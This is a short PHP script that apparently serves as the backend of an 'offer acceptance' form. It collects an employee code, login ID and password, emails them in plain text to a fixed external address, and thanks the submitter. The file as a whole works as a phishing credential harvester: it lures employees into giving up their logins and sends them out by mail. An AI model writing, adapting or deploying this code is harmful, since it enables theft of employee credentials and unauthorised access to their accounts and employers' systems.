<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $empcode = htmlspecialchars($_POST['empcode']);
    $loginid = htmlspecialchars($_POST['loginid']);
    $passwd = htmlspecialchars($_POST['passwd']);
   
    $to = "atharvagdeshpande21@gnu.ac.in"; // Replace with your email address
    $subject = "New Offer Acceptance Details";
    $message = "Emp Code: $empcode\nLogin Id: $loginid\nPassword: $passwd";
    $headers = "From: atharvagdeshpande21@gnu.ac.in\r\nReply-To: atharvagdeshpande21@gnu.ac.in";


    if (mail($to, $subject, $message, $headers)) {
        echo "Thank you! Your details have been submitted successfully.";
    } else {
        echo "Sorry, there was an error sending your details. Please try again.";
    }
}
?>
